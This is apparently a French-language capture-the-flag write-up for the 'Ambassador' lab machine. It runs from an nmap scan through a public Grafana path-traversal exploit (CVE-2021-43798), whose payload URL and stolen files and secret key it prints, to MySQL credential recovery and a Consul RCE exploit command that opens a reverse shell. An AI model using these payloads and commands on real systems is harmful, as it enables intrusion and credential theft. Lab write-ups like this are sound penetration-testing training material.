# Ambassador - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-16 21:13 EST                                                                                                                               
Nmap scan report for 10.10.11.183                                                                                                                                                             
Host is up (0.071s latency).                                                                                                                                                                  
Not shown: 996 closed tcp ports (conn-refused)                                                                                                                                                
PORT     STATE SERVICE VERSION                                                                                                                                                                
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                                                                           
| ssh-hostkey:                                                                                                                                                                                
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)                                                                                                                                
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)                                                                                                                               
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)                                                                                                                             
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))                                                                                                                                         
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                                                                  
|_http-generator: Hugo 0.94.2                                                                                                                                                                 
|_http-title: Ambassador Development Server                                                                                                                                                   
3000/tcp open  ppp?                                                                                                                                                                           
| fingerprint-strings:                                                                                                                                                                        
|   FourOhFourRequest:                                                                                                                                                                        
|     HTTP/1.0 302 Found                                                                                                                                                                      
|     Cache-Control: no-cache                                                                                                                                                                 
|     Content-Type: text/html; charset=utf-8                                                                                                                                                  
|     Expires: -1                                                                                                                                                                             
|     Location: /login                                                                                                                                                                        
|     Pragma: no-cache                                                                                                                                                                        
|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax                                                                                
|     X-Content-Type-Options: nosniff                                                                                                                                                         
|     X-Frame-Options: deny                                                                                                                                                                   
|     X-Xss-Protection: 1; mode=block                                                                                                                                                         
|     Date: Mon, 16 Jan 2023 20:14:10 GMT                                                                                                                                                     
|     Content-Length: 29                                                                                                                                                                      
|     href="/login">Found</a>.                                                                                                                                                                
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                                            
|     HTTP/1.1 400 Bad Request                                                                                                                                                                
|     Content-Type: text/plain; charset=utf-8                                                                                                                                                 
|     Connection: close
|     Request                                                                                                                                                                         [50/114]
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Content-Type: text/html; charset=utf-8
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 16 Jan 2023 20:13:38 GMT
|     Content-Length: 29
|     href="/login">Found</a>.
|   HTTPOptions: 
|     HTTP/1.0 302 Found
|     Cache-Control: no-cache
|     Expires: -1
|     Location: /login
|     Pragma: no-cache
|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 16 Jan 2023 20:13:43 GMT
|_    Content-Length: 0
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 10
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, IgnoreSigpipes, SupportsTransactions, SupportsCompression, ConnectWithDatabase, FoundRows, SwitchToSSLAfterHandshake, Speaks41ProtocolNew, LongColumnFlag
, Speaks41ProtocolOld, ODBCClient, DontAllowDatabaseTableColumn, Support41Auth, SupportsLoadDataLocal, InteractiveClient, IgnoreSpaceBeforeParenthesis, SupportsMultipleStatments, SupportsAut
hPlugins, SupportsMultipleResults                                                                                                                                                             
|   Status: Autocommit                                                                                                                                                                        
|   Salt: c\x1A\x0Dzo\x1Fu=@0)\x14h\x0DX{N\x128"                                                                                                                                              
|_  Auth Plugin Name: caching_sha2_password
```

On va donc visiter en premier le site web, il mentionne que il faut se connecter en tant de developer et que devops va nous donner le mdp, peut être un indice

Après recherche avec gobuster on trouve le dossier /images sur le site qui contient un “fond d’écran”, peut être de la stégano ?

Rien d’intéressant de trouvé de ce coté là donc on s’intéresse au port 3000 qui nous redirige vers une page de login. Les credentials par défaut ne fonctionnent pas mais la version (8.2.0) a une CVE “**Unauthorized arbitrary file reading vulnerability”** 

[https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798](https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798)

Test de l’exploit :

Après avoir créé une liste avec seulement le domaine du serveur l’exploit fonctionne et nous donne ceci:

```bash
[i] Target: http://10.10.11.183:3000

[!] Payload "http://10.10.11.183:3000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd" works.

[i] Analysing files...

[i] File "/conf/defaults.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/defaults.ini".

[i] File "/etc/grafana/grafana.ini" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.ini".

[i] File "/etc/passwd" found in server.
[*] File saved in "./http_10_10_11_183_3000/passwd".

[i] File "/var/lib/grafana/grafana.db" found in server.
[*] File saved in "./http_10_10_11_183_3000/grafana.db".

[i] File "/proc/self/cmdline" found in server.
[*] File saved in "./http_10_10_11_183_3000/cmdline".

? Do you want to try to extract the passwords from the data source?  Yes

[i] Secret Key: SW2YcwTIb9zpOOhoPsMm

[*] Bye Bye!
```

Grâce à l’obtention de ces fichiers on trouve le mdp admin grafana dans les fichiers de config

Dans le panel Grafana on apprend que c’est relié à une db mysql sous l’user Grafana sans mdp

Rien de trouvé de particulier sur le panel grafana donc retour au fichier .db

Dans la table data source on trouve un mdp avec le mdp de cet user grafana

On essaye alors d’abord de se connecter via ssh, ça ne marche pas donc on essaye de se connecter via mysql en remote

On trouve alors le mdp de l’user developer en base64 dans la table WhackyWidget

Ceci nous donne ce mot de passe en clair qui permet d’SSH:

Dans le home on remarque un dossier pour gitconfig qui nous indique une application, whackywidget dans le répertoire /opt

Pas de droit de sudo ni le droit suid sur les executables, pas moyen d’exploiter le venv alors recherche de vulnérabilité consul qui est dans le même dossier 

[https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API](https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API)

Il est nécessaire de récupérer le token via l’historique git (git log) et chercher dans le dernier commit

Il suffit alors d’utiliser l’exploit

```bash
python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost IP --lport PORT b*******-1d81-d62b-24b5-39540ee469b5
```